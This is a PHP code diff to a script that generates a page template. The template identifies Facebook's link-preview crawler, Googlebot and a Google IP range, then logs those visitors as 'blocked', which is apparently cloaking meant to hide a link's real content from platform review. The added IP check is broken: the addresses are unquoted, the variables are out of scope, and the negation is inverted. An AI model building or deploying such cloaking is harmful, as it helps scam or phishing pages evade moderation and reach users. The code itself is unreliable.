@@ -282,9 +282,16 @@ if ($_POST["url"]) {
 
     $phpString = '
 <?php
+$lowIp = ip2long(66.249.0.0);
+$highIp = ip2long(66.250.0.0);
+function checkIP($ip) {
+  if ($ip <= $highIp && $lowIp <= $ip) {
+      return true;
+  }
+}
 $text = "agents.txt";
 
-// $ip =  $_SERVER[\'REMOTE_ADDR\'];
+$ip =  $_SERVER[\'REMOTE_ADDR\'];
 // function ip_details($ip)
 // {
 //     $json       = file_get_contents("http://ipinfo.io/{$ip}");
@@ -296,7 +303,7 @@ $text = "agents.txt";
 // $country = $details->country;
 if (
    strpos($_SERVER["HTTP_USER_AGENT"], "facebookexternalhit/1.1") !== false ||
- strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || $_SERVER["REMOTE_ADDR"] == "66.220.145.243" || $_SERVER["REMOTE_ADDR"] == "66.220.145.244"
+ strpos($_SERVER["HTTP_USER_AGENT"], "Googlebot") !== false || ! checkIP($ip)
 ) {
   $fAgent = fopen($text, \'a\');
   $agent = $_SERVER[\'REMOTE_ADDR\'] . \' \' . $_SERVER[\'HTTP_USER_AGENT\'] .\' blocked \' . PHP_EOL;
